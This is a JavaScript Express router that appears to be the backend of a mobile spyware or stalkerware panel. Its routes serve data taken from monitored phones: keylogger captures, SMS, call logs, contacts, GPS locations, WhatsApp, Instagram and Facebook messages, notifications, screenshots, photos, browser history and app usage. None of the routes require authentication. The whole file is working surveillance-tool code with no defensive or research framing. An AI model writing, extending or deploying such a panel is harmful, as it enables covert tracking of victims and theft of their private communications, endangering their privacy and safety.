const express = require('express');
const router = express.Router();

// Models
const Device = require('../models/Device');
const CallLog = require('../models/CallLog');
const Sms = require('../models/Sms');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const Keylog = require('../models/Keylog');
const SocialMessage = require('../models/SocialMessage');
const Notification = require('../models/Notification');
const Screenshot = require('../models/Screenshot');
const BrowserHistory = require('../models/BrowserHistory');
const AppUsage = require('../models/AppUsage');
const Photo = require('../models/Photo');

// ========== STATISTICS ==========
router.get('/stats', async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const totalMessages = await Sms.countDocuments();
    const totalCalls = await CallLog.countDocuments();
    const totalLocations = await Location.countDocuments();
    const totalScreenshots = await Screenshot.countDocuments();
    const totalSocial = await SocialMessage.countDocuments();
    const totalNotifications = await Notification.countDocuments();
    
    res.json({ 
      success: true, 
      stats: { 
        totalDevices, 
        totalMessages, 
        totalCalls, 
        totalLocations, 
        totalScreenshots, 
        totalSocial, 
        totalNotifications 
      } 
    });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

// ========== DEVICES ==========
router.get('/devices', async (req, res) => {
  try {
    const devices = await Device.find().sort({ lastSeen: -1 });
    res.json({ success: true, data: devices });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== CALLS ==========
router.get('/calls', async (req, res) => {
  try {
    const calls = await CallLog.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: calls });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== MESSAGES (SMS) ==========
router.get('/messages', async (req, res) => {
  try {
    const messages = await Sms.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: messages });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== CONTACTS ==========
router.get('/contacts', async (req, res) => {
  try {
    const contacts = await Contact.find();
    res.json({ success: true, data: contacts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== LOCATIONS ==========
router.get('/locations', async (req, res) => {
  try {
    const locations = await Location.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: locations });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== KEYLOGS ==========
router.get('/keylogs', async (req, res) => {
  try {
    const keylogs = await Keylog.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: keylogs });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== SOCIAL MESSAGES (WhatsApp, Instagram, Facebook) ==========
router.get('/social-messages', async (req, res) => {
  try {
    const messages = await SocialMessage.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: messages });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== NOTIFICATIONS ==========
router.get('/notifications', async (req, res) => {
  try {
    const notifications = await Notification.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: notifications });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== SCREENSHOTS ==========
router.get('/screenshots', async (req, res) => {
  try {
    const screenshots = await Screenshot.find().sort({ timestamp: -1 }).limit(50);
    res.json({ success: true, data: screenshots });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== BROWSER HISTORY ==========
router.get('/browser-history', async (req, res) => {
  try {
    const history = await BrowserHistory.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: history });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== APP USAGE ==========
router.get('/app-usage', async (req, res) => {
  try {
    const usage = await AppUsage.find().sort({ timestamp: -1 }).limit(100);
    res.json({ success: true, data: usage });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== PHOTOS ==========
router.get('/photos', async (req, res) => {
  try {
    const photos = await Photo.find().sort({ timestamp: -1 }).limit(50);
    res.json({ success: true, data: photos });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========== RECENT ACTIVITY ==========
router.get('/recent', async (req, res) => {
  try {
    const calls = await CallLog.find().sort({ timestamp: -1 }).limit(10);
    const messages = await Sms.find().sort({ timestamp: -1 }).limit(10);
    const locations = await Location.find().sort({ timestamp: -1 }).limit(10);
    const keylogs = await Keylog.find().sort({ timestamp: -1 }).limit(10);
    const social = await SocialMessage.find().sort({ timestamp: -1 }).limit(10);
    const notifications = await Notification.find().sort({ timestamp: -1 }).limit(10);
    
    const all = [...calls, ...messages, ...locations, ...keylogs, ...social, ...notifications];
    all.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    
    res.json({ success: true, data: all.slice(0, 30) });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

module.exports = router;